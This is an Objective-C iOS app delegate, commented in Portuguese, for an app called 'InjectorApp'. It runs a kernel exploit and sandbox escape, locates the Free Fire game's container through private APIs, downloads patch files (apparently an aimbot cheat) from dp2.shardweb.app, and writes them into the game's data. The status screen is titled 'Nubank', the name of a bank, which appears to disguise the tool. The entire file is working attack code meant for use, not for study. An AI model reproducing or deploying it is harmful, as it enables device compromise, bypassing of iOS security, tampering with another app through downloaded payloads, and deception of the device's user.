// AppDelegate.m — InjectorApp principal
//
// Fluxo:
//   1. ke_init() — socket spray + IOSurface KRW + sandbox escape
//   2. Se sandbox escapou: usa container_manager para acessar container do FF
//   3. Download dos patches do dp2.shardweb.app/aim2/
//   4. Escreve patches no container do FF
//   5. Exibe resultado na UI

#import "AppDelegate.h"
#import <UIKit/UIKit.h>
#import "../../KernelExploit/include/kexploit.h"
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>

// ─── container_manager privado ────────────────────────────────────────────────
// Presentes em /usr/lib/system/libsystem_containermanager.dylib no device
// Precisam de sandbox escape para funcionar (entitlements de container access)

typedef void *container_ref;

static int (*fn_container_copy_sandbox_token)(const char *bundle_id,
                                              container_ref *out_ref) = NULL;
static int (*fn_container_object_sandbox_extension_activate)(
    container_ref ref, const char *path_ext, void **out) = NULL;
static void (*fn_container_free)(container_ref ref) = NULL;

static BOOL load_container_manager(void) {
    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_GLOBAL);
    if (!lib) {
        NSLog(@"[AppDelegate] libsystem_containermanager.dylib não encontrado: %s", dlerror());
        return NO;
    }
    fn_container_copy_sandbox_token =
        dlsym(lib, "container_copy_sandbox_token");
    fn_container_object_sandbox_extension_activate =
        dlsym(lib, "container_object_sandbox_extension_activate");
    fn_container_free = dlsym(lib, "container_free");

    if (!fn_container_copy_sandbox_token) {
        NSLog(@"[AppDelegate] container_copy_sandbox_token não encontrado");
        return NO;
    }
    return YES;
}

// ─── Localiza o container do Free Fire ───────────────────────────────────────

static NSString *find_ff_container(void) {
    // Método 1: via container_manager (requer sandbox escape)
    if (fn_container_copy_sandbox_token) {
        container_ref ref = NULL;
        int r = fn_container_copy_sandbox_token("com.dts.freefireth", &ref);
        if (r == 0 && ref) {
            void *ext = NULL;
            fn_container_object_sandbox_extension_activate(ref, "/", &ext);
            if (fn_container_free) fn_container_free(ref);
            // Após activate, procura o caminho no fs
            NSString *ff_base = @"/var/containers/Bundle/Application";
            NSArray *apps = [[NSFileManager defaultManager]
                             contentsOfDirectoryAtPath:ff_base error:nil];
            for (NSString *uuid in apps) {
                NSString *info_path = [NSString stringWithFormat:
                    @"%@/%@/com.dts.freefireth.app/Info.plist", ff_base, uuid];
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:info_path];
                if ([info[@"CFBundleIdentifier"] isEqualToString:@"com.dts.freefireth"]) {
                    NSLog(@"[AppDelegate] FF bundle encontrado: %@/%@", ff_base, uuid);
                    // Container de dados está em /var/mobile/Containers/Data/Application/<uuid>
                    // Precisa buscar o UUID de dados separadamente
                }
            }
        }
    }

    // Método 2: busca heurística no sistema de arquivos
    NSArray *search_paths = @[
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application",
    ];
    for (NSString *base in search_paths) {
        NSArray *items = [[NSFileManager defaultManager]
                          contentsOfDirectoryAtPath:base error:nil];
        for (NSString *uuid in items) {
            NSString *info = [NSString stringWithFormat:
                @"%@/%@/com.dts.freefireth.app/Info.plist", base, uuid];
            if ([[NSFileManager defaultManager] fileExistsAtPath:info]) {
                return [NSString stringWithFormat:@"%@/%@", base, uuid];
            }
        }
    }

    // Método 3: dados (saves, documents)
    NSArray *data_paths = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application",
    ];
    for (NSString *base in data_paths) {
        NSArray *items = [[NSFileManager defaultManager]
                          contentsOfDirectoryAtPath:base error:nil];
        for (NSString *uuid in items) {
            // Verifica se tem pasta Documents/com.dts.freefireth
            NSString *docs = [NSString stringWithFormat:
                @"%@/%@/Documents", base, uuid];
            NSString *meta = [NSString stringWithFormat:
                @"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
                base, uuid];
            NSDictionary *md = [NSDictionary dictionaryWithContentsOfFile:meta];
            if ([md[@"MCMMetadataIdentifier"] isEqualToString:@"com.dts.freefireth"]) {
                NSLog(@"[AppDelegate] FF data container: %@/%@", base, uuid);
                return [NSString stringWithFormat:@"%@/%@", base, uuid];
            }
        }
    }

    return nil;
}

// ─── Download de patches ──────────────────────────────────────────────────────

static NSString *const kServerBase = @"https://dp2.shardweb.app/aim2/";

static NSDictionary *patch_files(void) {
    return @{
        @"Assembly-CSharp-patch.bytes": @"Assembly-CSharp-patch.bytes",
        @"com.dts.freefireth.plist":    @"com.dts.freefireth.plist",
        @"config.bin":                  @"config.bin",
        @"localConfig.json":            @"localConfig.json",
    };
}

typedef void (^ProgressBlock)(NSString *message, float progress);
typedef void (^CompletionBlock)(BOOL success, NSString *message);

static void download_patches(NSString *dest_dir,
                              ProgressBlock progress,
                              CompletionBlock completion) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:dest_dir
  withIntermediateDirectories:YES
                   attributes:nil
                        error:nil];

    NSDictionary *files = patch_files();
    NSArray *keys = files.allKeys;
    __block NSUInteger done = 0;
    __block NSUInteger failed = 0;
    __block dispatch_group_t group = dispatch_group_create();

    for (NSString *filename in keys) {
        dispatch_group_enter(group);
        NSURL *url = [NSURL URLWithString:
            [kServerBase stringByAppendingString:filename]];
        NSURLSessionDataTask *task = [[NSURLSession sharedSession]
            dataTaskWithURL:url
          completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
            if (!err && data && [(NSHTTPURLResponse *)resp statusCode] == 200) {
                NSString *path = [dest_dir stringByAppendingPathComponent:filename];
                [data writeToFile:path atomically:YES];
                done++;
                if (progress) {
                    progress([NSString stringWithFormat:@"Baixado: %@", filename],
                             (float)done / keys.count);
                }
            } else {
                NSLog(@"[Patch] Falha ao baixar %@: %@", filename, err);
                failed++;
            }
            dispatch_group_leave(group);
        }];
        [task resume];
    }

    dispatch_group_notify(group, dispatch_get_main_queue(), ^{
        if (failed == 0) {
            completion(YES, @"Todos os patches baixados com sucesso");
        } else {
            completion(NO, [NSString stringWithFormat:
                @"Falha em %lu/%lu arquivos", (unsigned long)failed,
                (unsigned long)keys.count]);
        }
    });
}

// ─── Escrita dos patches no container ────────────────────────────────────────

static BOOL install_patches(NSString *ff_container, NSString *patches_dir) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dest_docs = [ff_container stringByAppendingPathComponent:@"Documents"];
    [fm createDirectoryAtPath:dest_docs
  withIntermediateDirectories:YES
                   attributes:nil
                        error:nil];

    NSDictionary *files = patch_files();
    for (NSString *filename in files) {
        NSString *src  = [patches_dir stringByAppendingPathComponent:filename];
        NSString *dest = [dest_docs   stringByAppendingPathComponent:filename];
        if (![fm fileExistsAtPath:src]) {
            NSLog(@"[Install] Arquivo não encontrado: %@", src);
            return NO;
        }
        NSError *err = nil;
        if ([fm fileExistsAtPath:dest]) [fm removeItemAtPath:dest error:nil];
        [fm copyItemAtPath:src toPath:dest error:&err];
        if (err) {
            NSLog(@"[Install] Erro ao copiar %@: %@", filename, err);
            return NO;
        }
        NSLog(@"[Install] Instalado: %@", dest);
    }
    return YES;
}

// ─── UI de status ─────────────────────────────────────────────────────────────

@interface StatusViewController : UIViewController
@property (nonatomic, strong) UILabel   *titleLabel;
@property (nonatomic, strong) UILabel   *statusLabel;
@property (nonatomic, strong) UIProgressView *progressView;
@property (nonatomic, strong) UILabel   *versionLabel;
@end

@implementation StatusViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor colorWithRed:0.05 green:0.05 blue:0.08 alpha:1.0];

    _titleLabel = [[UILabel alloc] init];
    _titleLabel.text = @"Nubank";
    _titleLabel.textColor = [UIColor colorWithRed:0.5 green:0.9 blue:0.3 alpha:1.0];
    _titleLabel.font = [UIFont boldSystemFontOfSize:28];
    _titleLabel.textAlignment = NSTextAlignmentCenter;
    _titleLabel.translatesAutoresizingMaskIntoConstraints = NO;

    _statusLabel = [[UILabel alloc] init];
    _statusLabel.text = @"Inicializando...";
    _statusLabel.textColor = [UIColor lightGrayColor];
    _statusLabel.font = [UIFont systemFontOfSize:14];
    _statusLabel.textAlignment = NSTextAlignmentCenter;
    _statusLabel.numberOfLines = 0;
    _statusLabel.translatesAutoresizingMaskIntoConstraints = NO;

    _progressView = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleDefault];
    _progressView.progress = 0.0;
    _progressView.progressTintColor = [UIColor colorWithRed:0.5 green:0.9 blue:0.3 alpha:1.0];
    _progressView.trackTintColor = [UIColor colorWithWhite:0.2 alpha:1.0];
    _progressView.translatesAutoresizingMaskIntoConstraints = NO;

    _versionLabel = [[UILabel alloc] init];
    _versionLabel.text = @"v2.0";
    _versionLabel.textColor = [UIColor darkGrayColor];
    _versionLabel.font = [UIFont systemFontOfSize:11];
    _versionLabel.textAlignment = NSTextAlignmentCenter;
    _versionLabel.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:_titleLabel];
    [self.view addSubview:_statusLabel];
    [self.view addSubview:_progressView];
    [self.view addSubview:_versionLabel];

    [NSLayoutConstraint activateConstraints:@[
        [_titleLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [_titleLabel.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor
                                                  constant:-80],

        [_progressView.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [_progressView.topAnchor constraintEqualToAnchor:_titleLabel.bottomAnchor
                                                constant:24],
        [_progressView.widthAnchor constraintEqualToAnchor:self.view.widthAnchor
                                                multiplier:0.7],

        [_statusLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [_statusLabel.topAnchor constraintEqualToAnchor:_progressView.bottomAnchor
                                               constant:16],
        [_statusLabel.widthAnchor constraintEqualToAnchor:self.view.widthAnchor
                                               multiplier:0.85],

        [_versionLabel.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [_versionLabel.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor
                                                   constant:-16],
    ]];
}

- (void)setStatus:(NSString *)msg progress:(float)p {
    dispatch_async(dispatch_get_main_queue(), ^{
        self->_statusLabel.text = msg;
        [self->_progressView setProgress:p animated:YES];
    });
}

- (void)setStatusError:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self->_statusLabel.text = msg;
        self->_statusLabel.textColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1.0];
        self->_progressView.progressTintColor = [UIColor colorWithRed:1.0 green:0.3 blue:0.3 alpha:1.0];
        [self->_progressView setProgress:1.0 animated:YES];
    });
}

- (void)setStatusSuccess:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self->_statusLabel.text = msg;
        self->_statusLabel.textColor = [UIColor colorWithRed:0.5 green:0.9 blue:0.3 alpha:1.0];
        [self->_progressView setProgress:1.0 animated:YES];
    });
}

@end

// ─── AppDelegate ──────────────────────────────────────────────────────────────

@interface AppDelegate ()
@property (nonatomic, strong) StatusViewController *statusVC;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {

    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    _statusVC = [[StatusViewController alloc] init];
    self.window.rootViewController = _statusVC;
    [self.window makeKeyAndVisible];

    // Inicia pipeline em background
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self runPipeline];
    });

    return YES;
}

- (void)runPipeline {
    // ── Passo 1: Kernel exploit ───────────────────────────────────────────────
    [_statusVC setStatus:@"Iniciando exploit do kernel..." progress:0.05];

    ke_status_t rc = ke_init();
    KernelCapabilities caps = ke_capabilities();

    NSLog(@"[Pipeline] ke_init=%d krw=%d sandbox=%d proc=%d",
          rc, caps.krw, caps.sandbox_escape, caps.proc_self);

    if (rc != KE_OK || !caps.krw) {
        // Sem KRW, não podemos aplicar os patches via container_manager
        // Tenta modo fallback: apenas downloads (sem acesso ao container do FF)
        NSLog(@"[Pipeline] KRW falhou (%d), tentando fallback sem exploit", rc);
        [_statusVC setStatus:@"Exploit indisponível — modo fallback..." progress:0.15];
        [self runFallbackDownload];
        return;
    }

    // ── Passo 2: Sandbox escape ───────────────────────────────────────────────
    [_statusVC setStatus:@"Sandbox escape..." progress:0.25];

    if (!caps.sandbox_escape) {
        ke_status_t sbs = ke_sandbox_escape();
        caps = ke_capabilities();
        NSLog(@"[Pipeline] sandbox_escape=%d caps.sandbox=%d", sbs, caps.sandbox_escape);
    }

    if (!caps.sandbox_escape) {
        [_statusVC setStatus:@"Sandbox escape falhou — modo fallback..." progress:0.3];
        [self runFallbackDownload];
        return;
    }

    NSLog(@"[Pipeline] [SBX] *** SANDBOX ESCAPED ***");
    [_statusVC setStatus:@"Sandbox escapado ✓" progress:0.35];

    // ── Passo 3: Carrega container_manager ───────────────────────────────────
    [_statusVC setStatus:@"Localizando container do Free Fire..." progress:0.4];

    BOOL cm_ok = load_container_manager();
    NSLog(@"[Pipeline] container_manager carregado=%d", cm_ok);

    NSString *ff_container = find_ff_container();
    NSLog(@"[Pipeline] ff_container=%@", ff_container ?: @"não encontrado");

    if (!ff_container) {
        [_statusVC setStatusError:@"Free Fire não encontrado.\nInstale o Free Fire antes de usar."];
        return;
    }

    [_statusVC setStatus:[NSString stringWithFormat:@"Free Fire encontrado ✓\n%@", ff_container]
                progress:0.5];

    // ── Passo 4: Download dos patches ────────────────────────────────────────
    [_statusVC setStatus:@"Baixando patches..." progress:0.55];

    NSString *tmp_dir = [NSTemporaryDirectory()
                         stringByAppendingPathComponent:@"xitpatches"];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL dl_ok = NO;
    __block NSString *dl_msg = nil;

    download_patches(tmp_dir,
        ^(NSString *msg, float p) {
            [self->_statusVC setStatus:msg progress:0.55f + p * 0.25f];
        },
        ^(BOOL success, NSString *message) {
            dl_ok = success;
            dl_msg = message;
            dispatch_semaphore_signal(sem);
        });

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC));

    if (!dl_ok) {
        [_statusVC setStatusError:[NSString stringWithFormat:@"Falha no download:\n%@", dl_msg]];
        return;
    }

    NSLog(@"[Pipeline] Download OK: %@", dl_msg);
    [_statusVC setStatus:@"Patches baixados ✓" progress:0.82];

    // ── Passo 5: Instala patches no container ─────────────────────────────────
    [_statusVC setStatus:@"Instalando patches..." progress:0.88];

    BOOL inst_ok = install_patches(ff_container, tmp_dir);
    NSLog(@"[Pipeline] install=%d", inst_ok);

    if (!inst_ok) {
        [_statusVC setStatusError:@"Falha ao instalar patches no container do Free Fire."];
        return;
    }

    // Limpa temporários
    [[NSFileManager defaultManager] removeItemAtPath:tmp_dir error:nil];

    // ── Concluído ─────────────────────────────────────────────────────────────
    NSLog(@"[Pipeline] *** COMPLETO ***");
    [_statusVC setStatusSuccess:@"✓ Patches instalados!\n\nAbra o Free Fire agora."];

    // Libera recursos do exploit após 10s (kernel objects precisam persistir)
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC),
                   dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
        ke_cleanup();
    });
}

// ─── Fallback: download apenas, sem exploit ───────────────────────────────────
// Usado quando o exploit não está disponível nesta versão do iOS.
// Baixa os arquivos para o Documents do próprio app (sandbox) e exibe
// instruções manuais para o usuário.

- (void)runFallbackDownload {
    [_statusVC setStatus:@"Baixando arquivos de patch..." progress:0.3];

    NSArray *paths = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *dest = [paths.firstObject stringByAppendingPathComponent:@"patches"];

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block BOOL dl_ok = NO;
    __block NSString *dl_msg = nil;

    download_patches(dest,
        ^(NSString *msg, float p) {
            [self->_statusVC setStatus:msg progress:0.3f + p * 0.5f];
        },
        ^(BOOL success, NSString *message) {
            dl_ok = success;
            dl_msg = message;
            dispatch_semaphore_signal(sem);
        });

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC));

    if (!dl_ok) {
        [_statusVC setStatusError:[NSString stringWithFormat:
            @"Sem conexão com o servidor\n%@", dl_msg]];
        return;
    }

    [_statusVC setStatusSuccess:[NSString stringWithFormat:
        @"Arquivos baixados (sem exploit).\n"
         "iOS %s não suportado nesta versão.\n"
         "Patches em: %@",
        ke_ios_version(), dest]];
}

@end
